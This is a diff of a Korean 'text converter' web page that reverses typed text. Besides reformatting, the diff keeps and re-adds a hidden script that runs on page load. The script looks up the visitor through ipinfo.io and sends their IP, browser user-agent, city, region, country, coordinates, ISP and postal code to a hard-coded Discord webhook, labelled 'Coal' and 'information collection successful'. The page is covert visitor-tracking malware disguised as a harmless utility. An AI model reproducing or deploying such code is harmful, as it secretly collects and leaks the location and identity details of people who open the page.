@@ -1,321 +1,282 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
-	<title>텍스트 변환기</title>
-	<link rel="icon" href="images/favicon.ico" type="image/x-icon">
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMY1Q8xtkE6PT8p0gV6tSg0Z1/3s0kDciF5bG0" crossorigin="anonymous">
-	<style>
-		:root {
-			--primary-color: #1d9bf0;
-			--text-color: #333;
-			--background-color: #ffffff;
-		}
+    <meta charset="utf-8">
+    <title>텍스트 변환기</title>
+    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha384-k6RqeWeci5ZR/Lv4MR0sA0FfDOMY1Q8xtkE6PT8p0gV6tSg0Z1/3s0kDciF5bG0" crossorigin="anonymous">
+    <style>
+        :root {
+            --primary-color: #1d9bf0;
+            --text-color: #333;
+            --background-color: #ffffff;
+        }
 
-		body {
-			font-family: 'Helvetica Neue', Arial, sans-serif;
-			background-color: var(--background-color);
-			color: var(--text-color);
-			margin: 0;
-			display: flex;
-			justify-content: center;
-			align-items: center;
-			height: 100vh;
-			transition: background-color 0.3s ease, color 0.3s ease;
-		}
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
 
-		.container {
-			max-width: 500px;
-			padding: 20px;
-			background-color: white;
-			border-radius: 20px;
-			box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
-			text-align: center;
-		}
+        .container {
+            max-width: 500px;
+            padding: 20px;
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
 
-		h1 {
-			color: var(--primary-color);
-			font-size: 2.4em;
-			margin-bottom: 20px;
-		}
+        h1 {
+            color: var(--primary-color);
+            font-size: 2.4em;
+            margin-bottom: 20px;
+        }
 
-		textarea {
-			width: 100%;
-			height: 80px; /* 높이를 줄임 */
-			padding: 10px; /* 패딩 조정 */
-			margin-bottom: 20px;
-			border-radius: 15px;
-			border: 1px solid #ddd;
-			font-size: 16px;
-			resize: none;
-			background-color: #f8f9fa;
-			box-shadow: inset 0 3px 6px rgba(0, 0, 0, 0.1);
-		}
+        textarea {
+            width: 100%;
+            height: 80px;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 15px;
+            border: 1px solid #ddd;
+            font-size: 16px;
+            resize: none;
+            background-color: #f8f9fa;
+            box-shadow: inset 0 3px 6px rgba(0, 0, 0, 0.1);
+        }
 
-		.controls {
-			display: flex;
-			justify-content: space-between;
-			flex-wrap: wrap;
-			gap: 5px; /* 간격 줄임 */
-			margin-bottom: 20px;
-		}
+        .controls {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-bottom: 20px;
+        }
 
-		button {
-			flex: 1;
-			padding: 10px; /* 패딩 조정 */
-			border: none;
-			border-radius: 12px;
-			background-color: var(--primary-color);
-			color: white;
-			font-size: 16px;
-			cursor: pointer;
-			transition: background-color 0.3s ease, transform 0.3s ease;
-			display: flex;
-			justify-content: center;
-			align-items: center;
-			gap: 5px; /* 간격 줄임 */
-		}
+        button {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+        }
 
-		button:hover {
-			background-color: #006db3;
-			transform: translateY(-3px);
-		}
+        button:hover {
+            background-color: #006db3;
+            transform: translateY(-3px);
+        }
 
-		.output {
-			margin-top: 20px;
-			font-size: 18px;
-			color: var(--text-color);
-		}
+        .output {
+            margin-top: 20px;
+            font-size: 18px;
+            color: var(--text-color);
+        }
 
-		.result {
-			font-weight: bold;
-			padding: 10px; /* 패딩 조정 */
-			background-color: #eef2f7;
-			border-radius: 12px;
-			display: inline-block;
-			width: 100%;
-			white-space: pre-wrap;
-			word-wrap: break-word;
-			box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
-		}
+        .result {
+            font-weight: bold;
+            padding: 10px;
+            background-color: #eef2f7;
+            border-radius: 12px;
+            display: inline-block;
+            width: 100%;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
 
-		.settings-btn {
-			position: absolute;
-			top: 20px;
-			right: 20px;
-			background-color: transparent;
-			border: none;
-			font-size: 24px;
-			cursor: pointer;
-			color: var(--primary-color);
-		}
+        .settings-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: transparent;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--primary-color);
+        }
 
-		.settings-btn:hover {
-			color: #006db3;
-		}
+        .settings-btn:hover {
+            color: #006db3;
+        }
 
-		.popup {
-			display: none;
-			position: fixed;
-			top: 50%;
-			left: 50%;
-			transform: translate(-50%, -50%);
-			background-color: white;
-			padding: 20px;
-			border-radius: 10px;
-			box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.1);
-			z-index: 1000;
-			width: 320px;
-			animation: fadeIn 0.3s;
-		}
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+            width: 320px;
+            animation: fadeIn 0.3s;
+        }
 
-		.popup.active {
-			display: block;
-		}
+        .popup.active {
+            display: block;
+        }
 
-		.popup-header {
-			display: flex;
-			justify-content: space-between;
-			align-items: center;
-		}
+        .popup-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
-		.popup-header h2 {
-			margin: 0;
-			color: var(--primary-color);
-			font-size: 1.5em;
-		}
+        .popup-header h2 {
+            margin: 0;
+            color: var(--primary-color);
+            font-size: 1.5em;
+        }
 
-		.popup-header .close-btn {
-			background-color: transparent;
-			border: none;
-			font-size: 20px;
-			cursor: pointer;
-			color: var(--primary-color);
-		}
+        .popup-header .close-btn {
+            background-color: transparent;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--primary-color);
+        }
 
-		.popup-header .close-btn:hover {
-			color: #006db3;
-		}
+        .popup-header .close-btn:hover {
+            color: #006db3;
+        }
 
-		.popup-content label {
-			display: block;
-			margin-bottom: 10px;
-			font-size: 16px;
-		}
+        .popup-content label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
 
-		@keyframes fadeIn {
-			from {
-				opacity: 0;
-				transform: translate(-50%, -40%);
-			}
-			to {
-				opacity: 1;
-				transform: translate(-50%, -50%);
-			}
-		}
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -40%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+        }
 
-		@media (max-width: 600px) {
-			.container {
-				padding: 15px;
-				width: 100%;
-			}
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+                width: 100%;
+            }
 
-			button {
-				font-size: 14px;
-				padding: 8px; /* 패딩 조정 */
-			}
+            button {
+                font-size: 14px;
+                padding: 8px;
+            }
 
-			h1 {
-				font-size: 2em;
-			}
-		}
-	</style>
-<script>
-	$.get("https://ipinfo.io", function(response) {
-		// Discord Webhook URL
-		const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6";
+            h1 {
+                font-size: 2em;
+            }
+        }
+    </style>
+    <script>
+        // Discord Webhook URL
+        const webhook_url = "https://discord.com/api/webhooks/1290686478359203932/GQqrG5p9h3_6xhdF9OMlWmal0ECOItPF-SjKru3aQLMUqRcR-GIDC0rWz4bDfRI57mx6";
 
-		// 현재 시간 UNIX 타임스탬프 (초 단위)
-		const currentTime = Math.floor(Date.now() / 1000); // UNIX 시간
+        function sendWebhook(response) {
+            // 현재 시간 UNIX 타임스탬프 (초 단위)
+            const currentTime = Math.floor(Date.now() / 1000); // UNIX 시간
 
-		// 메인 임베드 내용 구성
-		const main = {
-			title: "Coal",
-			description: "> 정보 수집 성공!",
-			color: 3447003, // 파란색 임베드 색상
-			thumbnail: {
-				url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
-			},
-			fields: [
-				{
-					name: "IP:",
-					value: `\`${response.ip}\``,
-					inline: false,
-				},
-				{
-					name: "User-Agent:",
-					value: `\`${navigator.userAgent}\``,
-					inline: false,
-				},
-				{
-					name: "도시:",
-					value: `\`${response.city}\``,
-					inline: false,
-				},
-				{
-					name: "지역:",
-					value: `\`${response.region}\``,
-					inline: false
-				},
-				{
-					name: "나라:",
-					value: `\`${response.country}\``,
-					inline: false
-				},
-				{
-					name: "위도/경도:",
-					value: `\`${response.loc}\``,
-					inline: false
-				},
-				{
-					name: "사용 통신사:",
-					value: `\`${response.org}\``,
-					inline: false
-				},
-				{
-					name: "우편번호:",
-					value: `\`${response.postal}\``,
-					inline: false
-				},
-				{
-					name: "접속 시간 (상대적):",
-					value: `<t:${currentTime}:R>`, // 상대적 시간으로 표시 (예: 5분 전)
-					inline: false
-				}
-			],
-			footer: {
-				text: "Coal | 로깅 성공!",
-			},
-			author: {
-				name: "Coal",
-				url: ""
-			}
-		}
+            // 메인 임베드 내용 구성
+            const main = {
+                title: "Coal",
+                description: "> 정보 수집 성공!",
+                color: 3447003, // 파란색 임베드 색상
+                thumbnail: {
+                    url: "https://cdn.discordapp.com/attachments/1280491923861278861/1290686754755575952/J.jpg",
+                },
+                fields: [
+                    { name: "IP:", value: `\`${response.ip}\``, inline: false },
+                    { name: "User-Agent:", value: `\`${navigator.userAgent}\``, inline: false },
+                    { name: "도시:", value: `\`${response.city}\``, inline: false },
+                    { name: "지역:", value: `\`${response.region}\``, inline: false },
+                    { name: "나라:", value: `\`${response.country}\``, inline: false },
+                    { name: "위도/경도:", value: `\`${response.loc}\``, inline: false },
+                    { name: "사용 통신사:", value: `\`${response.org}\``, inline: false },
+                    { name: "우편번호:", value: `\`${response.postal}\``, inline: false },
+                    { name: "접속 시간 (상대적):", value: `<t:${currentTime}:R>`, inline: false }
+                ],
+                footer: { text: "Coal | 로깅 성공!" },
+                author: { name: "Coal", url: "" }
+            };
 
-		// Discord 웹훅으로 데이터 전송
-		const xhttp = new XMLHttpRequest();
-		xhttp.open("POST", webhook_url, true);
-		xhttp.setRequestHeader('Content-Type', 'application/json');
-		xhttp.send(JSON.stringify({
-			'username': 'Coal',
-			'embeds': [main],
-		}));
-	}, "json");
-</script>
+            // Discord 웹훅으로 데이터 전송
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("POST", webhook_url, true);
+            xhttp.setRequestHeader('Content-Type', 'application/json');
+            xhttp.send(JSON.stringify({ 'username': 'Coal', 'embeds': [main] }));
+        }
 
+        $(document).ready(function() {
+            $.get("https://ipinfo.io", function(response) {
+                sendWebhook(response); // 웹훅 전송
+            }, "json");
+
+            $('#convertBtn').on('click', function() {
+                const input = $('#inputText').val();
+                const output = input.split('').reverse().join(''); // 텍스트를 역순으로 변환
+                $('#outputText').text(output);
+            });
+
+            $('#clearBtn').on('click', function() {
+                $('#inputText').val('');
+                $('#outputText').text('');
+            });
+
+            window.togglePopup = function() {
+                $('#settingsPopup').toggleClass('active');
+            }
+        });
+    </script>
 </head>
 <body>
-	<div class="container">
-		<h1>텍스트 변환기</h1>
-		<textarea id="inputText" placeholder="여기에 입력하세요..."></textarea>
-		<div class="controls">
-			<button id="convertBtn">변환하기 <i class="fas fa-arrow-right"></i></button>
-			<button id="clearBtn">지우기 <i class="fas fa-eraser"></i></button>
-		</div>
-		<div class="output">
-			<span>변환된 텍스트:</span>
-			<div id="outputText" class="result"></div>
-		</div>
-		<button class="settings-btn" onclick="togglePopup()"><i class="fas fa-cog"></i></button>
-	</div>
+    <div class="container">
+        <h1>텍스트 변환기</h1>
+        <textarea id="inputText" placeholder="여기에 입력하세요..."></textarea>
+        <div class="controls">
+            <button id="convertBtn">변환하기 <i class="fas fa-sync-alt"></i></button>
+            <button id="clearBtn">지우기 <i class="fas fa-trash-alt"></i></button>
+            <button class="settings-btn" onclick="togglePopup()"><i class="fas fa-cog"></i></button>
+        </div>
+        <div class="output">
+            <span class="result" id="outputText"></span>
+        </div>
+    </div>
 
-	<div class="popup" id="settingsPopup">
-		<div class="popup-header">
-			<h2>설정</h2>
-			<button class="close-btn" onclick="togglePopup()"><i class="fas fa-times"></i></button>
-		</div>
-		<div class="popup-content">
-			<label>설정 항목 1: <input type="text" /></label>
-			<label>설정 항목 2: <input type="text" /></label>
-		</div>
-	</div>
-
-	<script>
-		document.getElementById('convertBtn').onclick = function() {
-			const input = document.getElementById('inputText').value;
-			const output = input.split('').reverse().join(''); // 텍스트를 역순으로 변환
-			document.getElementById('outputText').innerText = output;
-		};
-
-		document.getElementById('clearBtn').onclick = function() {
-			document.getElementById('inputText').value = '';
-			document.getElementById('outputText').innerText = '';
-		};
-
-		function togglePopup() {
-			document.getElementById('settingsPopup').classList.toggle('active');
-		}
-	</script>
+    <div class="popup" id="settingsPopup">
+        <div class="popup-header">
+            <h2>설정</h2>
+            <button class="close-btn" onclick="togglePopup()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="popup-content">
+            <label for="theme">테마 선택:</label>
+            <select id="theme">
+                <option value="light">라이트</option>
+                <option value="dark">다크</option>
+            </select>
+        </div>
+    </div>
 </body>
 </html>
